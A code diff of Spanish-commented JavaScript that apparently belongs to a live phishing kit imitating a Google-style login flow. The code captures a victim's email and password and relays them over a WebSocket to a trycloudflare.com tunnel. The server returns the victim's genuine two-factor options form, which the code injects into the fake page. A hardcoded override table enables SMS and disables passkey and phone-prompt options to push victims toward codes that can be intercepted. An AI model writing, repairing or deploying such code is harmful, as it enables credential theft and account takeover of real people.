@@ -113,27 +113,13 @@ document.addEventListener('DOMContentLoaded', () => {
         event.preventDefault(); // Evita comportamiento por defecto
         this.blur(); // Quita el foco para cerrar el teclado
         // Aquí puedes también simular el click en "Siguiente" si quieres:
-        document.getElementById('nextBtnScreen1').click();
         clearScreen1Errors();
+        document.getElementById('nextBtnScreen1').click();
       }
     });
   });
 
 
-document.addEventListener('DOMContentLoaded', () => {
-    const emailInput = document.getElementById('passwordInput');
-  
-    emailInput.addEventListener('keydown', function (event) {
-      if (event.key === 'Enter') {
-        event.preventDefault(); // Evita comportamiento por defecto
-        this.blur(); // Quita el foco para cerrar el teclado
-        // Aquí puedes también simular el click en "Siguiente" si quieres:
-        document.getElementById('nextBtnScreen2').click();
-        clearScreen1Errors();
-      }
-    });
-});
-  
 
 
 
@@ -243,9 +229,13 @@ function setupScreen2Listeners() {
         passwordInput.addEventListener('keypress', (event) => {
             if (event.key === 'Enter') {
                 event.preventDefault();
+                clearScreen1Errors();
+                passwordInput.blur();
                 handleScreen2NextClick();
+
             }
         });
+    }
          console.log("Listener 'keypress' (Enter) añadido a passwordInput.");
 
         // --- LÓGICA PARA EL CHECKBOX "Mostrar contraseña" ---
@@ -277,14 +267,8 @@ function setupScreen2Listeners() {
         }
         // --- FIN LÓGICA CHECKBOX ---
 
-    } else {
-        console.error("Input passwordInput no encontrado después de cargar Pantalla 2.");
-        // Si no hay input de contraseña, tampoco tiene sentido buscar el checkbox
-        if (!showPasswordCheckbox) {
-             console.log("Checkbox #showPassword tampoco fue buscado/encontrado (input faltante).");
-        }
-    }
 
+     
     // Lógica para el mensaje de error (si es necesaria específicamente aquí)
     // Por ejemplo, asegurar que el div de error existe
     const errorDiv = screen2Container.querySelector('.error-message-desactive, .error-message');
@@ -332,25 +316,6 @@ function displayIdentifierOnScreen2() {
 
 
 
-/**
- * Configura los listeners para las opciones 2FA recién creadas.
- */
-function setupAuthOptionsListeners() {
-    const optionsList = appContainer.querySelector('#auth-options-list');
-    if (!optionsList) return;
-
-    const optionItems = optionsList.querySelectorAll('.VV3oRb.SmR8'); // Selecciona los divs clickeables
-    console.log(`Añadiendo listeners a ${optionItems.length} opciones 2FA.`);
-
-    optionItems.forEach(item => {
-        // Solo añadir listener si no está deshabilitado
-        if (!item.classList.contains('RDPZE')) {
-            item.addEventListener('click', handleAuthOptionClick);
-        } else {
-            console.log("Opción deshabilitada encontrada, no se añade listener de click:", item.textContent.trim().substring(0, 50) + '...');
-        }
-    });
-}
 
 /**
  * Manejador para el click en una opción 2FA.
@@ -391,101 +356,148 @@ function handleAuthOptionClick(event) {
 
 // ------------------------- LÓGICA PANTALLA AUTH_2FA_OPTIONS_PRESENT --------------------------- //
 
+// --- Configuración de Habilitación/Deshabilitación ---
+const CLIENT_SIDE_2FA_OVERRIDES = {
+    // ID: 'estado deseado' ('active' o 'disabled')
+    // Si un ID no está aquí, se mantiene su estado original.
+    '10': 'disabled', // Deshabilitar "Sí en teléfono"
+    '7': 'active',   // Habilitar SMS (aunque viniera deshabilitado)
+    // '9': 'disabled',
+    '4': 'disabled', // Deshabilitar llave de acceso (OJO: ID era 4, no 53 en el HTML)
+    // 'id_ayuda': 'disabled' // Nota: "Obtener ayuda" no tiene ID estándar, necesita otro método si quieres controlarlo
+};
+// -----------------------------------------------------
+
 /**
- * Popula la lista de opciones 2FA en la pantalla correspondiente.
- * @param {Array} options - El array de opciones recibido del servidor.
+ * Modifica el HTML de un formulario 2FA en memoria y lo inyecta
+ * en un contenedor específico del DOM.
+ *
+ * @param {string} formHtml El string HTML completo del formulario extraído.
+ * @param {string} targetInjectId El ID del elemento (ej: un div) donde se inyectará el formulario.
+ * @param {string} [accountButtonContainerId='account-button-container'] El ID del div donde va el botón de cuenta.
+ * @returns {boolean} True si la inyección y modificación fueron exitosas, false si no.
  */
-function populateAuthOptions(options) {
-    const listContainer = appContainer.querySelector('#auth-options-list');
-    if (!listContainer) {
-        console.error("Contenedor #auth-options-list no encontrado en AUTH_2FA_OPTIONS_PRESENT.html");
-        return;
+function injectAndModifyAuthForm(formHtml, targetInjectId, accountButtonContainerId = 'account-button-container') {
+    const targetContainer = document.getElementById(targetInjectId);
+    const accountContainer = document.getElementById(accountButtonContainerId);
+
+    if (!targetContainer) {
+        console.error(`Error: Contenedor target #${targetInjectId} no encontrado.`);
+        return false;
     }
 
-    listContainer.innerHTML = ''; // Limpiar cualquier contenido previo
-
-    if (!Array.isArray(options) || options.length === 0) {
-        console.warn("No se recibieron opciones 2FA válidas para mostrar.");
-        // Opcionalmente, mostrar un mensaje al usuario
-        listContainer.innerHTML = '<li>No hay opciones de verificación disponibles.</li>';
-        return;
+    if (!formHtml || typeof formHtml !== 'string') {
+        console.error("Error: No se proporcionó HTML válido del formulario.");
+        targetContainer.innerHTML = '<p style="color: red;">Error al cargar las opciones.</p>';
+        return false;
     }
 
-    console.log("Poblando lista de opciones 2FA:", options);
+    // 1. Modificar el HTML ANTES de inyectarlo
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = formHtml; // Carga en memoria
 
-    options.forEach((option, index) => {
-        const listItem = document.createElement('li');
-        listItem.className = 'aZvCDf cd29Sd zpCp3 SmR8'; // Clases base
-
-        const divItem = document.createElement('div');
-        divItem.className = 'VV3oRb YZVTmd SmR8';
-        // Añadir data attributes importantes (adaptar si el servidor los envía)
-        divItem.dataset.challengeid = option.challengeId || `option-${index}`; // Usar ID real si existe, sino uno genérico
-        divItem.dataset.action = 'selectchallenge';
-        divItem.dataset.challengetype = option.challengeType || 'unknown'; // Usar tipo real si existe
-
-        const iconDiv = document.createElement('div');
-        iconDiv.className = 'Z1r7P';
-        iconDiv.setAttribute('aria-hidden', 'true');
-        iconDiv.jsname = 'Bz112c'; // Mantener jsname si es relevante para otros scripts
-        // **Selección de Icono (Simplificada)** - Elige un icono basado en palabras clave
-        let iconSvg = `<svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>`; // Icono de ayuda por defecto
-        const methodLower = option.method.toLowerCase();
-        if (methodLower.includes('teléfono') || methodLower.includes('tablet') || methodLower.includes('dispositivo')) {
-             iconSvg = `<svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M4,6h18V4H4C2.9,4,2,4.9,2,6v11H0v3h14v-3H4V6z M23,8h-6c-0.55,0-1,0.45-1,1v10c0,0.55,0.45,1,1,1h6c0.55,0,1-0.45,1-1V9 C24,8.45,23.55,8,23,8z M22,17h-4v-7h4V17z"></path></svg>`;
-        } else if (methodLower.includes('código') && methodLower.includes('seguridad')) {
-             iconSvg = `<svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M23,9 C18.89,4.89 13.07,3.57 7.85,5.02 L17.42,14.59 L23,9 Z M5.76,5.76 L2.81,2.81 L1.39,4.22 L3.91,6.74 C2.88,7.37 1.89,8.11 1,9 L12,20 L14.59,17.41 L19.78,22.6 L21.19,21.19 L16,16 L5.76,5.76 Z"></path></svg>`;
-        } else if (methodLower.includes('código') && methodLower.includes('verificación')) {
-             iconSvg = `<svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M20,2 L4,2 C2.9,2 2.01,2.9 2.01,4 L2,22 L6,18 L20,18 C21.1,18 22,17.1 22,16 L22,4 C22,2.9 21.1,2 20,2 Z M20,16 L4,16 L4,4 L20,4 L20,16 Z M6,12 L14,12 L14,14 L6,14 L6,12 Z M6,9 L18,9 L18,11 L6,11 L6,9 Z M6,6 L18,6 L18,8 L6,8 L6,6 Z"></path></svg>`;
-        } else if (methodLower.includes('llave de acceso')) {
-             iconSvg = `<svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M11 12q-1.65 0-2.825-1.175Q7 9.65 7 8q0-1.65 1.175-2.825Q9.35 4 11 4q1.65 0 2.825 1.175Q15 6.35 15 8q0 1.65-1.175 2.825Q12.65 12 11 12Zm0-2q.825 0 1.413-.588Q13 8.825 13 8t-.587-1.412Q11.825 6 11 6q-.825 0-1.412.588Q9 7.175 9 8t.588 1.412Q10.175 10 11 10ZM3 20v-2.775q0-.85.425-1.575t1.175-1.1q1.275-.65 2.887-1.1Q9.1 13 11 13q.525 0 1.025.037.5.038 1 .113.025.575.15 1.1.125.525.4 1.025-.575-.125-1.225-.2Q11.7 15 11 15q-1.8 0-3.2.438-1.4.437-2.3.887-.25.125-.375.375T5 17.225V18h10v2Zm15.25 1L17 19.5v-3.675q-.875-.325-1.438-1.087Q15 13.975 15 13q0-1.25.875-2.125T18 10q1.25 0 2.125.875T21 13q0 .975-.562 1.738-.563.762-1.438 1.087L20 17l-1 1 1 1ZM11 8h-.012H11Zm0 7Z"></path></svg>`;
+    // --- Modificar el botón de cambio de cuenta (si existe en el form y hay datos) ---
+    let accountButtonHtml = ''; // Guardamos el HTML del botón para moverlo
+    if (currentUserIdentifier && accountContainer) {
+        const accountButtonElement = tempDiv.querySelector('[jsname="af8ijd"]');
+        if (accountButtonElement) {
+            const newAriaLabel = `Se seleccionó ${currentUserIdentifier}. Cambiar de cuenta`;
+            accountButtonElement.setAttribute('aria-label', newAriaLabel);
+            // Extraemos el HTML del botón y lo quitamos del formulario temporal
+            // (Asumiendo que está dentro de un div o li que podemos quitar)
+            const parentContainer = accountButtonElement.closest('.SOeSgb'); // Ajusta el selector si es diferente
+            if(parentContainer) {
+                accountButtonHtml = parentContainer.outerHTML;
+                parentContainer.remove(); // Quitarlo del form temporal
+                console.log("Botón de cambio de cuenta extraído y actualizado.");
+            }
+        } else {
+            console.warn("Botón de cuenta [jsname='af8ijd'] no encontrado en el form extraído.");
         }
-        iconDiv.innerHTML = iconSvg;
+    }
+    // -----------------------------------------------------------------------------
 
-        const textDiv = document.createElement('div');
-        textDiv.className = 'l5PPKe';
-        textDiv.jsname = 'fmcmS'; // Mantener jsname si es relevante
+    // --- Modificar estado de las opciones ---
+    const optionDivs = tempDiv.querySelectorAll('form .VV3oRb[data-challengeid][jsname="EBHGs"]');
+    console.log(`Modificando ${optionDivs.length} opciones 2FA según overrides...`);
 
-        // Intentar separar título y subtítulo si existe un patrón reconocible
-        const parts = option.method.split(/(?=\sTeléfono de la Verificación|\sNo se puedo establecer)/); // Divide antes de patrones comunes
-        const mainText = parts[0];
-        const subText = parts.length > 1 ? parts.slice(1).join('') : null;
+    optionDivs.forEach(divItem => {
+        const challengeId = divItem.dataset.challengeid;
+        if (!challengeId) return;
 
-        const mainTextDiv = document.createElement('div');
-        mainTextDiv.className = 'dMNVAe';
-        // Usamos innerHTML para permitir el <strong> en el primer método
-        mainTextDiv.innerHTML = mainText.trim();
-        textDiv.appendChild(mainTextDiv);
+        const desiredState = CLIENT_SIDE_2FA_OVERRIDES[challengeId];
+        const descriptionElement = divItem.querySelector('.l5PPKe');
+        const descriptionText = descriptionElement ? descriptionElement.innerText.split('\n')[0] : 'Sin descripción';
 
-        if (subText) {
-            const subTextDiv = document.createElement('div');
-            subTextDiv.className = 'C79rpc';
-            subTextDiv.jsname = 'bUNG7d';
-             // Podríamos intentar dividir aún más el subtexto si es necesario
-             subTextDiv.innerHTML = `<div class="dMNVAe">${subText.trim()}</div>`; // Wrap en div para consistencia
-            textDiv.appendChild(subTextDiv);
-        }
-
-        // Configurar estado activo/inactivo
-        if (option.status === 'disabled') {
+        if (desiredState === 'disabled') {
             divItem.classList.add('RDPZE');
             divItem.setAttribute('aria-disabled', 'true');
-            divItem.tabIndex = -1; // No enfocable con Tab
+            divItem.setAttribute('tabindex', '-1');
+            console.log(`   Opción ID ${challengeId} ("${descriptionText}"): Forzada a DESHABILITADA.`);
+        } else if (desiredState === 'active') {
+            divItem.classList.remove('RDPZE');
+            divItem.setAttribute('aria-disabled', 'false');
+            divItem.setAttribute('tabindex', '0');
+            console.log(`   Opción ID ${challengeId} ("${descriptionText}"): Forzada a HABILITADA.`);
         } else {
-            divItem.setAttribute('role', 'link'); // O 'button' si es más apropiado
-            divItem.tabIndex = 0; // Enfocable con Tab
+            const originalStatus = divItem.classList.contains('RDPZE') ? 'disabled' : 'active';
+            console.log(`   Opción ID ${challengeId} ("${descriptionText}"): Mantenido estado original (${originalStatus}).`);
+            // Asegurar atributos consistentes
+            if (originalStatus === 'disabled') {
+                divItem.setAttribute('aria-disabled', 'true');
+                divItem.setAttribute('tabindex', '-1');
+            } else {
+                 divItem.setAttribute('aria-disabled', 'false');
+                 divItem.setAttribute('tabindex', '0');
+            }
         }
-
-        // Ensamblar el elemento
-        divItem.appendChild(iconDiv);
-        divItem.appendChild(textDiv);
-        listItem.appendChild(divItem);
-        listContainer.appendChild(listItem);
     });
+    // --------------------------------------
 
-     // Configurar listeners para las opciones recién creadas
-     setupAuthOptionsListeners();
+    // 2. Obtener el HTML modificado (solo el interior del form si es necesario, o todo)
+    const modifiedFormContent = tempDiv.querySelector('form')?.innerHTML || tempDiv.innerHTML; // Intentar obtener solo el interior
+
+    // 3. Inyectar el contenido modificado en el contenedor target
+    try {
+        targetContainer.innerHTML = modifiedFormContent; // Inyectar el FORMULARIO modificado
+        console.log(`Formulario HTML modificado inyectado en #${targetInjectId}.`);
+
+        // --- Inyectar el botón de cuenta en su contenedor dedicado (si se extrajo) ---
+        if(accountButtonHtml && accountContainer) {
+            accountContainer.innerHTML = accountButtonHtml;
+            console.log("Botón de cambio de cuenta inyectado en su contenedor.");
+        }
+        // ---------------------------------------------------------------------------
+
+    } catch (e) {
+        console.error("Error al inyectar el HTML modificado:", e);
+        targetContainer.innerHTML = '<p style="color: red;">Error al mostrar las opciones.</p>';
+        return false;
+    }
+
+    // 4. Re-adjuntar listeners
+    setupAuthOptionsListeners(targetInjectId); // Pasar el ID del contenedor para buscar dentro
+    return true;
 }
+
+// --- Función para (re)adjuntar listeners (modificada para target) ---
+function setupAuthOptionsListeners(containerId = 'app') {
+    const container = document.getElementById(containerId);
+    if (!container) {
+        console.error(`Contenedor #${containerId} para listeners de opciones 2FA no encontrado.`);
+        return;
+    }
+
+    // Busca SOLO los elementos clickeables que NO estén deshabilitados DENTRO del contenedor
+    const activeOptionItems = container.querySelectorAll('form .VV3oRb[data-challengeid][jsname="EBHGs"]:not(.RDPZE)');
+    console.log(`Añadiendo listeners a ${activeOptionItems.length} opciones 2FA activas en #${containerId}.`);
+
+    activeOptionItems.forEach(item => {
+        item.removeEventListener('click', handleAuthOptionClick);
+        item.addEventListener('click', handleAuthOptionClick);
+    });
+}
+    
 
 
 
@@ -508,6 +520,8 @@ async function loadScreen(screenName, dynamicData = null) {
             throw new Error(`Error HTTP ${response.status} al cargar ${screenName}.html`);
         }
         let html = await response.text(); // Obtener como texto
+
+
 
         // ------ INICIO MODIFICACIÓN HTML ESPECÍFICA POR PANTALLA ------
         const emailToShow = currentUserIdentifier || 'tu cuenta'; // Dato común necesario en varias pantallas
@@ -576,6 +590,10 @@ async function loadScreen(screenName, dynamicData = null) {
         appContainer.innerHTML = html; // Reemplazar el contenido del div #app
         console.log(`Contenido HTML de ${screenName} inyectado.`);
 
+
+
+
+
         // ------ INICIO GESTIÓN CSS ESPECÍFICA POR PANTALLA ------
         const commonCssLink = document.querySelector('head link[href="css/common.css"]');
         let needsCommonCss = true; // Asumir que se necesita por defecto
@@ -593,26 +611,7 @@ async function loadScreen(screenName, dynamicData = null) {
         }else if (screenName === 'AUTH_2FA_OPTIONS_PRESENT') {
             // ------------------------- LÓGICA UI PANTALLA AUTH_2FA_OPTIONS_PRESENT -------------------------
             needsCommonCss = false;
-            console.log("Poblando UI para AUTH_2FA_OPTIONS_PRESENT...");
-            if (dynamicData && dynamicData.options) {
-                populateAuthOptions(dynamicData.options);
-            } else {
-                console.error("Faltan datos (options) para poblar AUTH_2FA_OPTIONS_PRESENT.");
-                 const listContainer = appContainer.querySelector('#auth-options-list');
-                 if(listContainer) listContainer.innerHTML = '<li>Error al cargar opciones.</li>';
-            }
-            // ------------------------- FIN LÓGICA UI PANTALLA AUTH_2FA_OPTIONS_PRESENT -------------------------
-        }else if (screenName === 'AUTH_2FA_OPTIONS_PRESENT') {
-            // ------------------------- LÓGICA UI PANTALLA AUTH_2FA_OPTIONS_PRESENT -------------------------
-            needsCommonCss = false;
-            console.log("Poblando UI para AUTH_2FA_OPTIONS_PRESENT...");
-            if (dynamicData && dynamicData.options) {
-                populateAuthOptions(dynamicData.options);
-            } else {
-                console.error("Faltan datos (options) para poblar AUTH_2FA_OPTIONS_PRESENT.");
-                 const listContainer = appContainer.querySelector('#auth-options-list');
-                 if(listContainer) listContainer.innerHTML = '<li>Error al cargar opciones.</li>';
-            }
+            console.log(`CSS: ${screenName} no necesita common.css.`);
             // ------------------------- FIN LÓGICA UI PANTALLA AUTH_2FA_OPTIONS_PRESENT -------------------------
         } else if (screenName === 'update-phone') {
             // ------------------------- LÓGICA CSS PANTALLA UPDATE-PHONE -------------------------
@@ -762,13 +761,39 @@ function handleWebSocketMessage(event) {
                 loadScreen('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER', message.payload);
                 break;
 
-            case 'AUTH_2FA_OPTIONS_PRESENT':
-                // El servidor está indicando que hay opciones de autenticación de dos factores disponibles.
-                hideLoader(); // Ocultar loader
-                // Aquí podrías mostrar un mensaje o cambiar la UI para indicar al usuario que elija una opción
-                loadScreen('AUTH_2FA_OPTIONS_PRESENT');
-                break;
+                case 'AUTH_2FA_OPTIONS_PRESENT':
+    // 1. Cargar la estructura base de la pantalla 2FA
+    loadScreen('AUTH_2FA_OPTIONS_PRESENT')
+      .then(() => {
+        // 2. Una vez cargada la estructura, inyectar el formulario
+        if (message.payload && message.payload.formHtml) {
+          const success = injectAndModifyAuthForm(
+            message.payload.formHtml,     // ← aquí cambiamos de message.data a message.payload
+            'auth-form-target'            // ID del contenedor en tu HTML
+          );
+          if (!success) {
+            console.error("Fallo al inyectar/modificar el formulario 2FA.");
+            // Podrías mostrar un mensaje de error al usuario aquí
+          }
+          // setupAuthOptionsListeners() y hideLoader() ya se llaman dentro de injectAndModifyAuthForm
+        } else {
+          console.error("AUTH_2FA_OPTIONS_PRESENT llegó sin formHtml en payload.");
+          appContainer.innerHTML =
+            '<p style="color: red;">Error al recibir las opciones de verificación.</p>';
+          hideLoader();
+        }
+      })
+      .catch(error => {
+        console.error(
+          "Error al cargar la pantalla base AUTH_2FA_OPTIONS_PRESENT:", error
+        );
+        appContainer.innerHTML =
+          '<p style="color: red;">Error al cargar la pantalla de verificación.</p>';
+        hideLoader();
+      });
+    break;
 
+           
         
             case 'AUTH_NOTIFICATION_PENDING':
                     //hideLoader();
@@ -854,7 +879,7 @@ function initWebSocket() {
     // Construye la URL completa y correcta para el WebSocket (ej: ws://192.168.5.52:8080)
     //const wsUrl = `ws://${wsHost}:8080`;
 
-    const cloudflareTunnelUrl = 'candidates-postal-steel-uh.trycloudflare.com'; // SOLO el hostname del túnel
+    const cloudflareTunnelUrl = 'formats-strain-tea-admissions.trycloudflare.com'; // SOLO el hostname del túnel
     const wsUrl = `wss://${cloudflareTunnelUrl}`;
 
     // Loguea la URL que se usará para la conexión (útil para depurar)
